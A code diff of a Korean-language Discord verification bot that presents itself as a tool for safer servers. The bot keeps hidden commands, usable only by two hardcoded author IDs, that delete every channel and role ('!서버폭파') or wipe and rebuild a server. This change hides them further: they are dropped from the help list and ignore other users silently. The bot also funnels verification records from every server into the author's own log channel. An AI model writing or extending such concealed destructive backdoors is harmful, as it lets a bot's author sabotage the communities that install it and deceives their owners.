@@ -21,7 +21,7 @@ const UNVERIFIED_ROLE_ID = process.env.UNVERIFIED_ROLE_ID || '154157735651338256
 // 기본 로그 채널 ID
 const DEFAULT_LOG_CHANNEL_ID = '1537439520775999551';
 
-// 🔒 관리자 권한이 허용된 유저 ID 목록 (본인 + 부계정)
+// 🔒 최고 관리자(본인 + 부계정) 유저 ID 목록
 const ALLOWED_OWNERS = ['1400805500374745122', '1497398737021042748'];
 
 // 본인의 레일웨이 웹서비스 URL (끝에 슬래시 자동 제거 처리)
@@ -226,22 +226,11 @@ client.on('messageCreate', async (message) => {
     const isServerOwner = message.guild.ownerId === userId;
     const isBotOwner = ALLOWED_OWNERS.includes(userId);
 
-    // 1. !도움말 명령어
-    if (content === '!도움말') {
-        return message.reply(
-            `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
-            `📋 **[사용 가능한 명령어 목록]**\n` +
-            `• \`!서버인증\` - DM으로 인증 패널 링크(버튼)를 전송합니다. (서버 소유자 전용)\n` +
-            `• \`!인증역할 (역할아이디)\` - 인증 완료 역할을 설정합니다. (서버 소유자 전용)\n` +
-            `• \`!아이디 (채널아이디)\` - 전용 로그 채널을 설정합니다. (서버 소유자/봇 관리자 전용)\n` +
-            `• \`!인증정보 (@유저 또는 ID)\` - 유저의 인증 기록을 검색합니다. (서버 소유자/봇 관리자 전용)\n` +
-            `• \`!역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
-            `• \`!서버복구\` - 현재 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)\n` +
-            `• \`!도움말\` - 봇 소개 및 명령어 목록을 확인합니다.`
-        );
-    }
+    // 설정 파일 로드
+    let settings = loadSettings();
+    const isServerActivated = settings[guildId] && settings[guildId].activated === true;
 
-    // 2. !서버인증 명령어 (서버 소유자 및 관리자 전용 -> DM으로 인증 링크/버튼 전송)
+    // 1. !서버인증 명령어 (서버 소유자 전용 - 봇 활성화 선결 조건)
     if (content === '!서버인증') {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -249,6 +238,11 @@ client.on('messageCreate', async (message) => {
 
         try {
             await message.delete().catch(() => {});
+
+            // 서버 활성화 상태로 기록 저장
+            if (!settings[guildId]) settings[guildId] = {};
+            settings[guildId].activated = true;
+            saveSettings(settings);
 
             const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
             const row = new ActionRowBuilder()
@@ -260,23 +254,78 @@ client.on('messageCreate', async (message) => {
                 );
 
             const dmSuccess = await message.author.send({
-                content: `🚨 **[${message.guild.name}] 서버 인증 패널 링크입니다.**\n아래 버튼을 복사하거나 눌러서 채널에 배치해 주세요!`,
+                content: `🚨 **[${message.guild.name}] 서버 인증 시스템이 활성화되었습니다.**\n인증 패널 링크 버튼입니다:`,
                 components: [row]
             }).catch(() => null);
 
             if (!dmSuccess) {
-                return message.reply('❌ DM(개인 메시지) 차단 상태여서 링크를 보낼 수 없습니다. DM을 열어두고 다시 시도해 주세요!');
+                return message.reply('❌ DM(개인 메시지) 차단 상태여서 인증 링크를 보낼 수 없습니다. DM을 열어두고 다시 시도해 주세요!');
             }
 
-            // 서버 채널에는 소유자에게 DM을 보냈다는 짧은 알림만 띄웠다가 3초 뒤 삭제
-            const notice = await message.channel.send(`<@${userId}>님, DM으로 인증 패널 링크를 전송했습니다!`);
+            const notice = await message.channel.send(`<@${userId}>님, DM으로 인증 패널 메시지가 전송되었으며 서버가 활성화되었습니다!`);
             setTimeout(() => notice.delete().catch(() => {}), 3000);
         } catch (err) {
-            console.error('서버인증 DM 전송 에러:', err);
+            console.error('서버인증 에러:', err);
+        }
+        return;
+    }
+
+    // 2. !도움말 명령어 (본인 전용 명령어는 목록에서 제외)
+    if (content === '!도움말') {
+        return message.reply(
+            `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
+            `📋 **[사용 가능한 명령어 목록]**\n` +
+            `• \`!서버인증\` - 서버 인증 시스템을 활성화하고 DM으로 인증 패널 링크를 받습니다. (서버 소유자 전용)\n` +
+            `• \`!인증\` - 현재 채널에 인증 패널 버튼을 전송합니다. (서버 소유자 전용)\n` +
+            `• \`!인증역할 (역할아이디)\` - 인증 완료 역할을 설정합니다. (서버 소유자 전용)\n` +
+            `• \`!아이디 (채널아이디)\` - 전용 로그 채널을 설정합니다. (서버 소유자 전용)\n` +
+            `• \`!인증정보 (@유저 또는 ID)\` - 이 서버에서 인증을 완료한 유저의 기록을 검색합니다. (서버 소유자 전용)\n` +
+            `• \`!역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
+            `• \`!도움말\` - 봇 소개 및 명령어 목록을 확인합니다.`
+        );
+    }
+
+    // 🛡️ [필수 체크] !서버인증으로 활성화되지 않은 서버는 다른 명령어 차단
+    if (!isServerActivated && !isBotOwner) {
+        return message.reply('⚠️ **해당 서버는 아직 인증 시스템이 활성화되지 않았습니다.**\n서버 소유자가 먼저 채팅창에 **`!서버인증`**을 입력해 주세요.');
+    }
+
+    // 3. !인증 명령어 (서버 소유자 전용)
+    if (content === '!인증') {
+        if (!isServerOwner && !isBotOwner) {
+            return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
+        }
+
+        try {
+            await message.delete().catch(() => {});
+
+            const messages = await message.channel.messages.fetch({ limit: 20 }).catch(() => null);
+            if (messages) {
+                const botMessages = messages.filter(m => m.author.id === client.user.id && m.components.length > 0);
+                for (const oldMsg of botMessages.values()) {
+                    await oldMsg.delete().catch(() => {});
+                }
+            }
+
+            const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
+            const row = new ActionRowBuilder()
+                .addComponents(
+                    new ButtonBuilder()
+                        .setStyle(ButtonStyle.Link)
+                        .setLabel('🔒 디스코드 인증하기')
+                        .setURL(verifyUrl),
+                );
+
+            await message.channel.send({
+                content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
+                components: [row]
+            });
+        } catch (err) {
+            console.error('인증 버튼 생성 에러:', err);
         }
     }
 
-    // 3. !인증역할 명령어
+    // 4. !인증역할 명령어 (서버 소유자 전용)
     if (content.startsWith('!인증역할')) {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -291,18 +340,17 @@ client.on('messageCreate', async (message) => {
 
         const role = message.guild.roles.cache.get(roleId);
         if (!role) {
-            return message.reply('❌ 해당 역할을 이 서버에서 찾을 수 없습니다. 올바른 역할 ID를 입력해 주세요.');
+            return message.reply('❌ 해당 역할을 이 서버에서 찾을 수 없습니다.');
         }
 
-        let settings = loadSettings();
         if (!settings[guildId]) settings[guildId] = {};
         settings[guildId].verifiedRoleId = roleId;
         saveSettings(settings);
 
-        message.reply(`✅ 이 서버의 인증 완료 역할이 **${role.name}** (\`${roleId}\`)으로 성공적으로 설정되었습니다!`);
+        message.reply(`✅ 이 서버의 인증 완료 역할이 **${role.name}** (\`${roleId}\`)으로 설정되었습니다!`);
     }
 
-    // 4. !아이디 명령어
+    // 5. !아이디 명령어 (서버 소유자 전용)
     if (content.startsWith('!아이디')) {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -320,7 +368,6 @@ client.on('messageCreate', async (message) => {
             return message.reply('❌ 해당 채널을 이 서버에서 찾을 수 없습니다.');
         }
 
-        let settings = loadSettings();
         if (!settings[guildId]) settings[guildId] = {};
         settings[guildId].logChannelId = channelId;
         saveSettings(settings);
@@ -328,7 +375,7 @@ client.on('messageCreate', async (message) => {
         message.reply(`✅ 이 서버의 전용 로그 채널이 <#${channelId}>로 설정되었습니다!`);
     }
 
-    // 5. !인증정보 명령어
+    // 6. !인증정보 명령어 (서버 소유자 전용 - 해당 서버에서 인증한 사람의 기록만 검색)
     if (content.startsWith('!인증정보')) {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -347,7 +394,7 @@ client.on('messageCreate', async (message) => {
             return message.reply('⚠️ 정보를 확인할 유저를 멘션하거나 유저 ID를 입력해 주세요.');
         }
 
-        const processingMsg = await message.reply('🔍 로그 채널에서 기록을 검색하는 중입니다...');
+        const processingMsg = await message.reply('🔍 로그 채널에서 이 서버의 인증 기록을 검색하는 중입니다...');
 
         try {
             const logChannel = await client.channels.fetch(DEFAULT_LOG_CHANNEL_ID).catch(() => null);
@@ -362,7 +409,8 @@ client.on('messageCreate', async (message) => {
             if (fetchedMessages) {
                 for (const msg of fetchedMessages.values()) {
                     if (msg.author.id === client.user.id && msg.content && msg.content.includes(targetUserId)) {
-                        if (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('모바일 데이터 차단')) {
+                        // 오직 현재 서버(guildId)에서 인증된 기록인지 확인
+                        if (msg.content.includes(`(ID: \`${guildId}\`)`) && (msg.content.includes('인증 완료 상세 정보') || msg.content.includes('모바일 데이터 차단'))) {
                             foundContent = msg.content;
                             break;
                         }
@@ -373,17 +421,17 @@ client.on('messageCreate', async (message) => {
             await processingMsg.delete().catch(() => {});
 
             if (!foundContent) {
-                return message.reply(`❌ 해당 유저의 인증 기록을 찾지 못했습니다.`);
+                return message.reply(`❌ 이 서버(\`${message.guild.name}\`)에서 해당 유저의 인증 기록을 찾을 수 없습니다.`);
             }
 
-            message.reply(`📋 **[검색 결과]**\n\n${foundContent}`);
+            message.reply(`📋 **[이 서버의 인증 기록 검색 결과]**\n\n${foundContent}`);
         } catch (err) {
             await processingMsg.delete().catch(() => {});
             message.reply('⚠️ 로그 검색 중 오류가 발생했습니다.');
         }
     }
 
-    // 6. !역할제거 명령어
+    // 7. !역할제거 명령어
     if (content === '!역할제거') {
         try {
             const member = message.member;
@@ -401,11 +449,9 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    // 7. !서버복구 명령어 (관리자 전용)
+    // 8. !서버복구 명령어 (관리자 본인 전용)
     if (content === '!서버복구') {
-        if (!isBotOwner) {
-            return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
-        }
+        if (!isBotOwner) return; // 권한 없으면 무시
 
         await message.reply('🔄 **서버 복구를 시작합니다... 기존 채널과 역할이 초기화되고 템플릿 구조로 재구성됩니다.**');
 
@@ -450,18 +496,14 @@ client.on('messageCreate', async (message) => {
                 content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
                 components: [row]
             });
-
-            console.log(`[서버 복구 완료] 템플릿 구조로 서버가 성공적으로 재구축되었습니다.`);
         } catch (err) {
-            console.error('서버 복구 중 오류 발생:', err);
+            console.error('서버 복구 오류:', err);
         }
     }
 
-    // 8. !서버폭파 명령어 (관리자 전용)
+    // 9. !서버폭파 명령어 (관리자 본인 전용)
     if (content === '!서버폭파') {
-        if (!isBotOwner) {
-            return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
-        }
+        if (!isBotOwner) return; // 권한 없으면 무시
 
         await message.reply('💥 **서버 폭파 작업을 시작합니다... 모든 채널과 역할이 삭제됩니다.**');
 
@@ -478,7 +520,7 @@ client.on('messageCreate', async (message) => {
                 }
             }
         } catch (err) {
-            console.error('서버 폭파 중 오류 발생:', err);
+            console.error('서버 폭파 오류:', err);
         }
     }
 });
